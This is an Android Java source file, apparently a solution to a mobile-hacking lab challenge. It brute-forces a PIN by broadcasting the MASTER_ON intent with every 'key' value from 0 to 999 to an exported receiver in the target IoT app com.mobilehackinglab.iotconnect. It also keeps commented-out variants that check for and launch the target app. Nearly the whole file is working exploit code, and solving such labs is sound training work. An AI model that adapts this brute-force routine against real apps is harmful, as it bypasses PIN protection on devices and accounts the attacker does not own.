package com.example.iot_solver;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import java.util.Random;

import android.util.Log;




public class MainActivity extends AppCompatActivity {

    private static final String TAG = "IoTBruteforcer";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button button = findViewById(R.id.button);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                
                Log.d(TAG, "Start");

/*
                if (isAppInstalled("com.mobilehackinglab.iotconnect")) {
                    // startTargetApp("com.mobilehackinglab.iotconnect");
                    try { Thread.sleep(100); } catch(InterruptedException ex) { }

                    for (int i = 0; i <= 999; i = i + 1) {
                        sendBroadcastToMasterReceiver(i);

                        if (i % 100 == 0) {
                                try        
                                {
                                    Thread.sleep(1 * 1000);
                                    Log.d(TAG, "Running...");
                                } 
                                catch(InterruptedException ex) 
                                {
                                  Log.d(TAG, "Can't do sleep ..continue");
                                }
                        }

                        try        
                        {
                            Thread.sleep(50);
                        } 
                        catch(InterruptedException ex) 
                        {
                          // Log.d(TAG, "Can't do sleep ..continue");
                        }
 
                    }



                } else {
                    Toast.makeText(MainActivity.this, "App not installed.", Toast.LENGTH_SHORT).show();
                    Log.d(TAG, "App not installed..");
                }

*/

                    for (int i = 0; i <= 999; i = i + 1) {
                        sendBroadcastToMasterReceiver(i);

                        if (i % 100 == 0) {
                                try        
                                {
                                    Thread.sleep(1 * 1000);
                                    Log.d(TAG, "Running...");
                                } 
                                catch(InterruptedException ex) 
                                {
                                  Log.d(TAG, "Can't do sleep ..continue");
                                }
                        }

                        try        
                        {
                            Thread.sleep(50);
                        } 
                        catch(InterruptedException ex) 
                        {
                          // Log.d(TAG, "Can't do sleep ..continue");
                        }
 
                    }





                Log.d(TAG, "Stop");
                Toast.makeText(MainActivity.this, "Broadcast sent.", Toast.LENGTH_SHORT).show();
            }
        });
    }

    private boolean isAppInstalled(String packageName) {
        PackageManager packageManager = getPackageManager();
        try {
            packageManager.getPackageInfo(packageName, 0);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    private void sendBroadcastToMasterReceiver(int pin) {
        Intent intent = new Intent();
        intent.setAction("MASTER_ON");
        // intent.setClassName("com.mobilehackinglab.iotconnect", "com.mobilehackinglab.iotconnect.MasterReceiver");
        intent.putExtra("key", pin);
        sendBroadcast(intent);
    }

    /*

    private void startTargetApp(String packageName) {
        Intent launchIntent = getPackageManager().getLaunchIntentForPackage(packageName);
        if (launchIntent != null) {
            startActivity(launchIntent);
            Toast.makeText(this, "Target app launched.", Toast.LENGTH_SHORT).show();
        } else {
            Toast.makeText(this, "Unable to launch target app.", Toast.LENGTH_SHORT).show();
        }
    }
    */

/*
    private void startTargetApp(String packageName) {
        Intent intent = new Intent();
        intent.setClassName(packageName, "com.mobilehackinglab.iotconnect.LoginActivity");
        try {
            startActivity(intent);
            Toast.makeText(this, "Target app launched.", Toast.LENGTH_SHORT).show();
        } catch (Exception e) {
            Toast.makeText(this, "Unable to launch target app: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }
*/

    /*
private void startTargetApp(String packageName) {
    Intent launchIntent = getPackageManager().getLaunchIntentForPackage(packageName);
    if (launchIntent != null) {
        startActivity(launchIntent);
        Toast.makeText(this, "Target app launched.", Toast.LENGTH_SHORT).show();

        // Bring this app back to the foreground after launching the target app
        new android.os.Handler().postDelayed(() -> {
            Intent intent = new Intent(MainActivity.this, MainActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
            startActivity(intent);
        }, 1000); // Adjust delay as needed
    } else {
        Toast.makeText(this, "Unable to launch target app.", Toast.LENGTH_SHORT).show();
    }
}
*/


}


